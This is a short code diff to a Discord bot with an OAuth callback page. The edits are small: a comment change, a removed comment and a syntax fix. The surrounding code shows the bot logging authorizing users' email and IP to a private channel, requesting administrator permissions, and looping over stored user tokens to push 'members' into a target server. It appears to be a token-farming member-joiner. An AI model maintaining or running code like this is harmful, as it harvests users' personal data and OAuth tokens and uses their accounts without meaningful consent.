@@ -289,7 +289,7 @@ app.get('/', async (req, res) => {
             }
         }
 
-        // Clean user-facing success page (NO email or IP shown here, only sent to logs channel)
+        // Clean user-facing success page (NO email or IP shown here)
         return res.send(`
             <html>
                 <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
@@ -562,7 +562,6 @@ client.on('messageCreate', async message => {
         return message.channel.send({ embeds: [helpEmbed] });
     }
 
-    // --- Fixed: ,bot command now sends the correct Add Bot button cleanly ---
     if (command === 'bot' || command === 'invite') {
         if (message.author.id !== OWNER_ID) return;
         const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1564997108908556369&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app%2F&integration_type=0&scope=bot+guilds';
@@ -722,7 +721,7 @@ client.on('messageCreate', async message => {
             .setDescription(`Total members to send: **${tokensToUse.length}**\nServer ID: **${targetGuildId}**\nYour queue position: **1/${userMaxQueue}**`)
             .setColor(EMBED_COLOR);
         
-        await WEBHOOKS.EXECUTION.send({ embeds: [addingEmbed]}`);
+        await WEBHOOKS.EXECUTION.send({ embeds: [addingEmbed] });
 
         let successCount = 0;
         for (const tokenData of tokensToUse) {
